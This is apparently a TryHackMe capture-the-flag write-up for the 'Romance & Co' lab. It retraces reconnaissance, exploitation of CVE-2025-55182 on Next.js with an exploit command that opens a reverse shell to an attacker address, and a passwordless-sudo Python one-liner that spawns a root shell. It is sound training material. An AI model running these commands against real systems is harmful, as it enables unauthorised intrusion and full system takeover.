# Corp Website

# **Romance & Co - Security Assessment**

## **Objective**

As a security analyst, retrace the attacker's steps to uncover how vulnerabilities in the "Romance & Co" web application were exploited and determine the exact breach methodology.

## **Reconnaissance**

### **Source Code Inspection**

- Examined the page source and discovered two comments:
    
    html
    
    ```
    <!--3WpzTMYEK9QGOeqIBQxrR-->
    <!--$--><!--/$-->
    ```
    
    These comments may hint at internal identifiers or debugging artifacts.
    

### **Network Scanning**

- Performed an Nmap scan on the target:
    
    bash
    
    ```
    nmap -sV <target_ip>
    ```
    
- Results showed only two open ports:
    - **22/tcp** (SSH)
    - **3000/tcp** (HTTP)
- No other interesting services were identified.

### **HTTP Interception**

- Reloaded the main page and intercepted the `GET` request using a proxy (e.g., Burp Suite).
- Noticed a non‑standard header:
    
    text
    
    ```
    If-None-Match: "pjux6x9npj1xgt"
    ```
    
    This `If-None-Match` header is typically used for cache validation and may reveal information about the server technology.
    

### **Technology Fingerprinting**

- Used **Wappalyzer** (browser extension) to identify the web framework.
- Detected: **Next.js version 16.0.6**

## **Vulnerability Identification**

- Researched known vulnerabilities for Next.js 16.0.6.
- Discovered **CVE-2025-55182** (commonly referred to as **React2Shell**), a publicly disclosed vulnerability that allows remote code execution via specially crafted requests.
- This CVE was featured in a TryHackMe room, making exploitation straightforward.

## **Exploitation**

### **Obtaining a Reverse Shell**

- Downloaded the public exploit for React2Shell (or used the one provided in the TryHackMe room).
- Used **penelope** (a session handler) to manage the reverse shell.
- Executed the exploit against the target:
    
    bash
    
    ```
    python3 exploit.py --target http://<target_ip>:3000 --lhost <attacker_ip> --lport 4444
    ```
    
- After a short delay, an interactive reverse shell connected back to the attacker machine.

### **User Flag**

- Navigated to the home directory of the user `daniel`:
    
    bash
    
    ```
    cd /home/daniel
    ls
    ```
    
- Found the file `user.txt` and displayed its contents:
    
    bash
    
    ```
    cat user.txt
    ```
    
- Obtained the user flag (format: `THM{...}`).

## **Privilege Escalation**

### **Sudo Permissions**

- Checked which commands the current user (`daniel`) could run with elevated privileges:
    
    bash
    
    ```
    sudo -l
    ```
    
- Output:
    
    text
    
    ```
    User daniel may run the following commands on romance:
        (root) NOPASSWD: /usr/bin/python3
    ```
    
- This indicates that `daniel` can execute Python 3 as root without providing a password.

### **Gaining Root Access**

- Leveraged the Python interpreter to spawn a root shell:
    
    bash
    
    ```
    sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
    ```
    
- The command executed a root shell, granting full administrative access.

### **Root Flag**

- Changed to the root directory and listed its contents:
    
    bash
    
    ```
    cd /root
    ls
    ```
    
- Located `root.txt` and read it:
    
    bash
    
    ```
    cat root.txt
    ```
    
- Retrieved the root flag (format: `THM{...}`).

## **Conclusion**

The breach occurred due to two critical weaknesses:

1. **Outdated Software**: The application ran Next.js version 16.0.6, which is vulnerable to **CVE-2025-55182 (React2Shell)**. This allowed the attacker to gain an initial foothold.
2. **Weak Sudo Configuration**: The user `daniel` was permitted to run Python 3 as root without a password, enabling trivial privilege escalation.